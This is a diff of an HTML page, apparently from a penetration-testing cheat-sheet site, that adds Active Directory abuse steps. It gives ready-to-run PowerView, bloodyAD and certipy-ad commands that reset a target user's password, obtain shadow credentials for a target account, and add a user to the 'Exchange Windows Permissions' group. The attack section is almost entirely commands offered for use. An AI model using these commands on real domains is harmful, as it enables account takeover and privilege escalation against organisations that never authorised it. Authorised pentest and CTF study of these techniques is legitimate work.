@@ -42,13 +42,25 @@
   
   <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
   
+  <li><a href="https://tldrbins.github.io/@shadow-credentials/">Shadow Credentials</a></li>
+  
 </ul>
 
 <div class="content"><hr>
-<h3 id="using-powerviewps1">Using PowerView.ps1</h3>
+<h3 id="import-powerviewps1">Import PowerView.ps1</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="py">ps1</span>
-</span></span></code></pre></div><h4 id="authenticated">Authenticated</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Add user to group (e.g. Exchange Windows Permissions)</span>
+</span></span></code></pre></div><h3 id="abuse-1--change-target-user-password">Abuse #1 : Change Target User Password</h3>
+<h4 id="from-windows">From Windows</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$pass</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;password&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span> 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-DomainUserPassword</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">target_user</span><span class="p">&gt;</span> <span class="n">-AccountPassword</span> <span class="nv">$pass</span>
+</span></span></code></pre></div><h4 id="from-linux">From Linux</h4>
+<p><a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --host &lt;DC&gt; <span class="nb">set</span> password &lt;TARGET_USER&gt; &lt;NEW_PASSWORD&gt;
+</span></span></code></pre></div><h3 id="abuse-2--get-shawdow-credentials-from-linux">Abuse #2 : Get shawdow credentials (From Linux)</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> certipy-ad shadow auto -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -k -account &lt;TARGET_USER&gt; -target &lt;DC&gt;
+</span></span></code></pre></div><h3 id="abuse-3--add-user-to-group">Abuse #3 : Add user to group</h3>
+<h4 id="authenticated">Authenticated</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># For example &#39;Exchange Windows Permissions&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Add-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s2">&#34;Exchange Windows Permissions&#34;</span> <span class="n">-Members</span> <span class="n">USER</span>
 </span></span></code></pre></div><h4 id="runas">Runas</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$username</span> <span class="p">=</span> <span class="s2">&#34;domain\username&#34;</span>
